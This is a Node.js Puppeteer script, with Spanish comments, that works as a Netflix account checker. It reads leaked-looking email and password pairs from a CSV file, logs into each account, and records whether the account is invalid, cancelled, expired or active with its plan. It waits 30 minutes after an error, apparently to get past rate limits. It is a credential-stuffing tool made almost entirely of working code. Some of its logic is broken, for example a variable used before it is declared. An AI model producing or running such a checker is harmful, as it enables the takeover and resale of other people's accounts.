const puppeteer = require("puppeteer");
const fs = require("fs");
const { parse } = require("csv-parse");

// Array para almacenar los datos del archivo CSV
const acc = [];

// Leer el archivo CSV y almacenar los datos en el array acc
fs.createReadStream("./netflix.csv")
  .pipe(
    parse({
      separator: ",",
    })
  )
  .on("data", (row) => acc.push(row));

// Función para retrasar la ejecución por un tiempo determinado
function delay(time) {
  return new Promise(function (resolve) {
    setTimeout(resolve, time);
  });
}

// Función para agregar datos al archivo CSV de salida
function addCsv(email, comments) {
  const data = `${email},${comments}\n`;
  fs.appendFile("Out.csv", data, (err) => {
    if (err) throw err;
  });
}

(async () => {
  // Mensajes de bienvenida
  console.log("Bienvenido a Premium y Codigos Netflix Checker");
  console.log("Iniciamos proceso");
  console.log("***********");
  console.log("");
  console.log("");

  // Iniciar el navegador Puppeteer
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  // Recorrer el array acc
  for await (const i of acc) {
    try {
      // Obtener los datos de acceso
      const email = i[0];
      const password = i[1];

      // Limpiar las cookies y abrir la página de inicio de sesión de Netflix
      await page.goto("https://netflix.com/clearcookies");
      await delay(500);
      await page.goto("https://www.netflix.com/cl/login", {
        waitUntil: "networkidle0",
      });

      // Ingresar el correo electrónico y la contraseña
      await page.waitForSelector("#\\:r0\\:");
      await page.click("#\\:r0\\:");
      await page.type("#\\:r0\\:", email);
      await page.type("#\\:r3\\:", password);
      await page.click(
        "#appMountPoint > div > div > div.default-ltr-cache-8hdzfz.eyojgsc0 > div > form > button"
      );

      // Verificar si hay un error de contraseña
      try {
        await page.waitForSelector(
          "#appMountPoint > div > div > div.default-ltr-cache-8hdzfz.eyojgsc0 > div > header > div > div > div",
          { timeout: 2000 }
        );
        console.log(`${email}: E-mail o Password Incorrecto`);
        addCsv(email, "E-mail o Password Incorrecto");
        continue;
      } catch (error) {}

      // Verificar si la suscripción ha sido cancelada
      try {
        await page.waitForSelector(
          "#appMountPoint > div > div > div > div.simpleContainer > div > div.planContainer > div.stepHeader-container > div > h1",
          { timeout: 2000 }
        );
        const resuscribe = await page.$eval(
          "#appMountPoint > div > div > div > div.simpleContainer > div > div.planContainer > div.stepHeader-container > div > h1",
          (el) => el.textContent
        );
        console.log(`${email}: Suscripción cancelada totalmente`);
        addCsv(email, "Suscripción cancelada totalmente");
        continue;
      } catch (error) {}

      // Verificar la fecha de facturación
      await page.goto("https://www.netflix.com/account/membership");
      try {
        const addFormaPago = await page.$(
          "#clcsBanner > div > div > div > div > div > div > div:nth-child(1) > div > div > div.e1mhm34t0.default-ltr-cache-1cc42km.ew2l6qe0 > div > div > div:nth-child(1) > span > span"
        );
        if (addFormaPago) {
          console.log(`${email}: Cuenta Vencida`);
          addCsv(email, element);
          continue;
        }
        const element = await page.$("#CHANGEABLE > b");
        if (element) {
          const status = await page.$eval(
            "#CHANGEABLE > b",
            (el) => el.textContent
          );
          const plan = await page.$eval(
            "#appMountPoint > div > div > div > div.bd > div > div > div.responsive-account-content > div:nth-child(2) > section > div > div:nth-child(1) > div:nth-child(1) > div > b",
            (el) => el.textContent
          );
          console.log(`${email}: ${status} - ${plan}`);
          addCsv(email, element);
          continue;
        }
        await page.waitForSelector(
          "#appMountPoint > div > div > div > section > div.default-ltr-cache-1fhvoso.eslj5pt1 > div > div > div > div > div > div.default-ltr-cache-16dvsg3.el0v7280 > section > div:nth-child(2) > div > div.default-ltr-cache-1cr1i8r.e19xx6v33 > h3",
          { timeout: 3000 }
        );
        const suspended = await page.$eval(
          "#appMountPoint > div > div > div > section > div.default-ltr-cache-1fhvoso.eslj5pt1 > div > div > div > div > div > div.default-ltr-cache-16dvsg3.el0v7280 > section > div:nth-child(2) > div > div.default-ltr-cache-1cr1i8r.e19xx6v33 > h3",
          (el) => el.textContent
        );
        const plan = await page.$eval(
          "#appMountPoint > div > div > div > section > div.default-ltr-cache-1fhvoso.eslj5pt1 > div > div > div > div > div > div.default-ltr-cache-16dvsg3.el0v7280 > section > div:nth-child(3) > div > div > div > p.default-ltr-cache-16uw6l2.euy28771",
          (el) => el.textContent
        );
        console.log(`${email}: ${suspended} - ${plan}`);
        addCsv(email, suspended);
        continue;
      } catch (error) {}

      try {
        const expirationMessage = await page.$eval(
          "#appMountPoint > div > div > div > div.bd > div > div > div.billingSectionSpace > table > tbody > tr.retableHeading > th.col.billPeriod.nowrap",
          (el) => el.textContent
        );
        const expirationDate = await page.$eval(
          "#appMountPoint > div > div > div > div.bd > div > div > div.billingSectionSpace > table > tbody > tr:nth-child(2) > td.col.billPeriod",
          (el) => el.textContent
        );
        console.log(`${email}: ${expirationMessage} ${expirationDate}`);
        addCsv(email, `${expirationMessage} ${expirationDate}`);
        continue;
      } catch (error) {}

      try {
        const expirationMessage = await page.$eval(
          "#appMountPoint > div > div > div > section > div.default-ltr-cache-1fhvoso.eslj5pt1 > div > div > div > div > div > div.default-ltr-cache-16dvsg3.el0v7280 > section > div:nth-child(2) > div > div.default-ltr-cache-1cr1i8r.e19xx6v33 > h3",
          (el) => el.textContent
        );
        const plan = await page.$eval(
          "#appMountPoint > div > div > div > section > div.default-ltr-cache-1fhvoso.eslj5pt1 > div > div > div > div > div > div.default-ltr-cache-16dvsg3.el0v7280 > section > div:nth-child(3) > div > div > div > p.default-ltr-cache-16uw6l2.euy28771",
          (el) => el.textContent
        );
        console.log(`${email}: ${expirationMessage} - ${plan}`);
        addCsv(email, expirationMessage);
        continue;
      } catch (error) {
        console.error(`${email}: Hay problemas, revisar manual`);
        continue;
      }
    } catch (error) {
      await delay(1800000);
      addCsv(email, error);
      console.log(`${email}: ${error}`);
      continue;
    }
  }

  // Mensajes de despedida
  console.log("");
  console.log("");
  console.log("***********");
  console.log("Terminando proceso...");
  browser.close();
  console.log("Terminó correctamente");
})();
